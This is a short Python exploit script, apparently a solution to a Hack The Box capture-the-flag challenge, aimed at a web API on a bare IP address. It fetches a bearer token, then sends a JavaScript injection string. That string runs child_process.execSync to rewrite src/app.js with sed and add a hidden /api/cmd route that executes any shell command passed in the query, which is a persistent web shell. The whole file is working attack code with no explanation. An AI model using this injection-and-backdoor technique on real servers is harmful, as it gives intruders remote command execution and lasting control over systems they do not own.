import requests

# Define URLs and headers
url = "http://83.136.255.222:35961/api/auth/authenticate"
url2 = "http://83.136.255.222:35961/api/service/generate"
headers = {'Content-Type': 'application/json'}
payload = {'email': 'test@hackthebox.com'}

# Send the initial authentication request
print("Attacking " + url)
response = requests.post(url, json=payload, headers=headers)
data = response.text

# Extract the token from the response
token = response.json().get('token')
print("The standalone token is:", token)

# Define the new headers with the extracted token
headers2 = {
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {token}'
}

# Define the payload with the injection string to add at line 15
inj = (
    "'}) + require('child_process').execSync("
    "'sed -i \"15i app.get(\\'\\/api/cmd\\', (req, res) => { const cmd = require(\\'child_process\\').execSync(req.query.cmd).toString(); res.send(cmd); });\" src/app.js'"
    ") //"
)

# Create the payload
payload2 = {'text': inj}

# Send the second request with the payload
response2 = requests.post(url2, json=payload2, headers=headers2)
data2 = response2.text

# Print the response from the second request
print(data2)
